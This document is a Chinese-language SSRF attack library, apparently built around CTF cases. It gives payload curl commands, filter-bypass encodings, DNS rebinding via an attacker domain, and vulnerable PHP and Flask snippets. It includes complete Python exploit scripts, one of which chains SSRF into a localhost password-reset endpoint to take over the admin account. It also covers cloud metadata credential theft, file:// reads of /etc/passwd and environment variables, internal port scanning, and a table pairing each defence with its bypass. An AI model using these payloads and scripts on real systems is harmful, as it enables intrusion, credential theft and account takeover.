# SSRF 服务端请求伪造 - 攻击库
**Keywords**: SSRF, Server-Side Request Forgery, Internal Network, Localhost, 127.0.0.1, URL Parameter, Webhook, File Protocol

## 1. 基础SSRF攻击方法

### 方法1: 直接访问内部URL

```bash
# 访问内部服务
curl "http://target/fetch?url=http://internal-service"
curl "http://target/fetch?url=http://127.0.0.1"
curl "http://target/fetch?url=http://localhost"

# 访问云服务元数据
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### 方法2: file:// 协议读取本地文件

```bash
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///proc/self/environ"
curl "http://target/fetch?url=file:///app/config.php"
```

### 方法3: 访问本地受限服务

```bash
# 访问本地管理员界面
curl "http://target/profile?picture_url=http://127.0.0.1/admin"
curl "http://target/profile?picture_url=http://127.0.0.1/admin/flag"

# 访问本地密码重置功能
curl "http://target/profile?picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked"
```

## 2. SSRF绕过技巧

### 绕过1: 127.0.0.1的不同表示形式

```bash
# 标准形式
http://127.0.0.1
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://2130706433  # 十进制
http://0x7f000001  # 十六进制

# IPv6
http://[::1]
http://[::ffff:127.0.0.1]
http://[::]
```

### 绕过2: localhost的变体

```bash
http://localhost
http://localhost:80
http://localhost:8080
http://localhost:3306
http://localhost:5432
```

### 绕过3: DNS重绑定

```bash
# 创建指向127.0.0.1的子域名
http://internal.attacker.com  # 第一次解析为外网IP，第二次解析为127.0.0.1
```

### 绕过4: URL解析差异

```bash
# 使用@符号混淆
http://internal-service@127.0.0.1

# 使用#和?混淆
http://127.0.0.1#.external.com
http://127.0.0.1?.external.com

# 使用多斜杠
http:///127.0.0.1
http:////127.0.0.1

# 使用端口号混淆
http://127.0.0.1:80@internal-service
```

### 绕过5: URL编码

```bash
# 十六进制编码
http://127%2e0%2e0%2e1
http://127%2E0%2E0%2E1

# 双重编码
http://127%252e0%252e0%252e1

# Unicode编码
http://127。0。0。1  # 使用全角句号
```

## 3. 案例020 - PHP SSRF 完整利用

### 漏洞代码
```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $response = file_get_contents($url);  // SSRF漏洞
    echo "<pre>" . htmlspecialchars($response) . "</pre>";
}
?>
```

### 攻击Payload

```bash
# 访问内部服务
curl "http://target/redirect.php?url=http://internal-service"
curl "http://target/redirect.php?url=http://localhost"
curl "http://target/redirect.php?url=http://127.0.0.1"

# 使用不同形式的127.0.0.1
curl "http://target/redirect.php?url=http://127.1"
curl "http://target/redirect.php?url=http://0x7f000001"
```

### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import re

def exploit_ssrf(base_url):
    try:
        base_url = base_url.rstrip('/')
        print(f"[*] 目标: {base_url}")
        print("[*] 漏洞: SSRF\n")
        
        payloads = [
            'http://internal-service',
            'http://localhost',
            'http://127.0.0.1',
            'http://127.1',
            'http://0x7f000001',
            'http://[::1]',
        ]
        
        session = requests.Session()
        
        for payload in payloads:
            try:
                print(f"[*] 尝试: {payload}")
                r = session.get(f"{base_url}/redirect.php", params={'url': payload}, timeout=10)
                
                if r.status_code == 200 and ('flag' in r.text.lower()):
                    print(f"\n{'='*60}")
                    print(f"[+] 成功! 响应:")
                    print(r.text[:500])
                    print(f"{'='*60}\n")
                    return r.text
            except:
                pass
        
        return None
        
    except Exception as e:
        print(f"[-] 错误: {str(e)}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    exploit_ssrf(sys.argv[1])
```

## 4. 案例024 - Flask SSRF + 本地管理员功能

### 漏洞代码
```python
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        profile_picture_url = request.form.get('profile_picture_url')
        if profile_picture_url:
            try:
                filename = secure_filename(profile_picture_url.split('/')[-1])
                urllib.request.urlretrieve(profile_picture_url, 
                    os.path.join(app.config['UPLOAD_FOLDER'], filename))  # SSRF漏洞
            except:
                pass

@app.route('/reset_password', methods=['GET'])
def reset_password():
    if request.remote_addr != '127.0.0.1':  # 仅限本地
        return "Unauthorized", 403
    username = request.args.get('username')
    users[username]['password'] = request.args.get('newpassword')
```

### 攻击步骤

```bash
# 1. 注册用户
curl -X POST "http://target/register" \
  -d "username=testuser&password=testpass"

# 2. 登录
curl -X POST "http://target/login" \
  -d "username=testuser&password=testpass" \
  -c cookies.txt

# 3. 利用SSRF访问本地管理员密码重置
curl -X POST "http://target/profile" \
  -b cookies.txt \
  -d "first_name=Test&last_name=User&email=test@test.com&profile_picture_url=http://127.0.0.1:5000/reset_password?username=admin&newpassword=hacked"

# 4. 使用新密码登录管理员
curl -X POST "http://target/login" \
  -d "username=admin&password=hacked" \
  -c admin_cookies.txt

# 5. 访问管理员个人资料获取FLAG
curl "http://target/profile" -b admin_cookies.txt
```

### Python完整利用脚本

```python
#!/usr/bin/env python3
import requests
import sys

def exploit_ssrf_password_reset(base_url):
    try:
        base_url = base_url.rstrip('/')
        session = requests.Session()
        
        print(f"[*] 目标: {base_url}")
        print("[*] 漏洞: SSRF + 本地管理员功能\n")
        
        # 步骤1: 注册用户
        print("[*] 步骤1: 注册用户...")
        register_data = {"username": "testuser", "password": "testpass"}
        r = session.post(f"{base_url}/register", data=register_data, timeout=10)
        print("[+] 注册成功\n")
        
        # 步骤2: 登录
        print("[*] 步骤2: 登录...")
        login_data = {"username": "testuser", "password": "testpass"}
        r = session.post(f"{base_url}/login", data=login_data, timeout=10)
        print("[+] 登录成功\n")
        
        # 步骤3: 使用SSRF访问本地重置密码功能
        print("[*] 步骤3: 利用SSRF重置管理员密码...")
        
        profile_data = {
            'first_name': 'Test',
            'last_name': 'User',
            'email': 'test@test.com',
            'profile_picture_url': 'http://127.0.0.1:5000/reset_password?username=admin&newpassword=hacked'
        }
        
        r = session.post(f"{base_url}/profile", data=profile_data, timeout=10)
        print("[+] SSRF请求已发送\n")
        
        # 步骤4: 用新密码登录admin
        print("[*] 步骤4: 使用新密码登录admin...")
        admin_session = requests.Session()
        admin_login = {"username": "admin", "password": "hacked"}
        r = admin_session.post(f"{base_url}/login", data=admin_login, timeout=10)
        print("[+] 管理员登录成功\n")
        
        # 步骤5: 获取FLAG
        print("[*] 步骤5: 获取FLAG...")
        r = admin_session.get(f"{base_url}/profile", timeout=10)
        
        if 'flag' in r.text.lower():
            print(f"\n{'='*60}")
            print(f"[+] 成功获取FLAG!")
            print(f"{'='*60}\n")
            print(r.text)
            return True
        else:
            print("[-] 未找到FLAG")
            return False
            
    except Exception as e:
        print(f"[-] 错误: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    print("="*60)
    print("案例024 SSRF漏洞利用脚本")
    print("="*60 + "\n")
    
    exploit_ssrf_password_reset(sys.argv[1])
```

## 5. 案例033 - Markdown SSRF

### 漏洞代码
```python
@app.route('/convert', methods=['POST'])
def convert():
    url = request.form.get('url')
    if url:
        response = urllib.request.urlopen(url)  # SSRF漏洞
        raw_data = response.read()
        # 处理markdown...
```

### 攻击Payload

```bash
# 访问管理员界面
curl -X POST "http://target/convert" \
  -d "url=http://127.0.0.1/admin"

# 访问flag页面
curl -X POST "http://target/convert" \
  -d "url=http://127.0.0.1/admin/flag"

# 使用localhost
curl -X POST "http://target/convert" \
  -d "url=http://localhost/admin/flag"

# 使用IPv6
curl -X POST "http://target/convert" \
  -d "url=http://[::1]/admin/flag"
```

### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup

def exploit_ssrf(target_url, internal_url="http://127.0.0.1/admin/flag"):
    convert_url = target_url.rstrip('/') + "/convert"
    
    data = {'url': internal_url}
    
    print(f"[*] 目标: {convert_url}")
    print(f"[*] 内部URL: {internal_url}\n")
    
    response = requests.post(convert_url, data=data)
    
    if response.status_code == 200:
        print(f"[+] SSRF攻击成功!")
        print(f"[+] 响应内容:")
        print(response.text[:1000])
        return True
    else:
        print(f"[-] 攻击失败: {response.status_code}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    print("="*60)
    print("案例033 SSRF漏洞利用脚本")
    print("="*60 + "\n")
    
    exploit_ssrf(sys.argv[1])
```

## 6. 其他SSRF攻击向量

### 访问云平台元数据

```bash
# AWS
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure
curl "http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2019-06-01"

# GCP
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Kubernetes
curl "http://target/fetch?url=http://10.0.0.1/api/v1/namespaces"
```

### 端口扫描

```bash
for port in 22 80 443 3306 5432 6379 9200 27017; do
  curl -s "http://target/fetch?url=http://127.0.0.1:$port" | head -n 5
done
```

### DNS解析测试

```bash
# 记录DNS请求
curl "http://target/fetch?url=http://random-subdomain.attacker.com"

# 检查日志查看是否发起了DNS请求
```

## 7. 高级SSRF技巧

### 使用SSRF探测内网服务

```python
import requests
import time

def ssrf_port_scan(target_url, host="127.0.0.1"):
    """
    使用SSRF进行端口扫描
    """
    open_ports = []
    common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
    
    for port in common_ports:
        try:
            r = requests.get(f"{target_url}/fetch", 
                           params={'url': f'http://{host}:{port}'},
                           timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] 端口 {port} 可能开放")
                open_ports.append(port)
        except:
            pass
    
    return open_ports
```

### 利用SSRF执行RCE

```bash
# 如果服务支持gopher协议
curl "http://target/fetch?url=gopher://127.0.0.1:9000/..."

# 如果有FTP服务
curl "http://target/fetch?url=ftp://admin:admin@127.0.0.1"
```

## 8. 防御绕过总结

| 防御方式 | 绕过方法 |
|---------|---------|
| 检查localhost | 使用127.0.0.1, 127.1, 0x7f000001等变体 |
| 检查127.0.0.1 | 使用localhost, [::1], 0.0.0.0等 |
| 检查http/https | 使用file://, ftp://, gopher://等 |
| 黑名单IP | DNS重绑定、子域名重定向 |
| 禁用file:// | 使用dict://, ldap://等协议 |


## 场景补充

### 场景1: 访问内部管理员接口
```bash
curl "http://target/fetch?url=http://127.0.0.1/admin"
curl "http://target/fetch?url=http://localhost:8080/api/admin"
curl "http://target/fetch?url=http://[::1]/internal"
```

### 场景2: 云服务元数据窃取
```bash
# AWS
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/user-data/"

# Azure  
curl "http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
```

### 场景3: 内网端口扫描
```python
import requests
for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200]:
    r = requests.get(f"http://target/fetch?url=http://127.0.0.1:{port}")
    if r.status_code == 200:
        print(f"[+] Port {port} is open")
```

### 场景4: file://协议读取本地文件
```bash
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///app/flag.txt"
curl "http://target/fetch?url=file:///proc/self/environ"
```

### 场景5: 重置其他用户密码(组合SSRF+本地接口)
```bash
# 步骤1: 注册普通用户
curl -X POST "http://target/register" -d "username=attacker&password=pass"

# 步骤2: 利用SSRF访问本地密码重置接口
curl -X POST "http://target/profile" \
  -d "picture_url=http://127.0.0.1:5000/reset_password?username=admin&newpassword=hacked"

# 步骤3: 用新密码登录admin
curl -X POST "http://target/login" -d "username=admin&password=hacked"
```
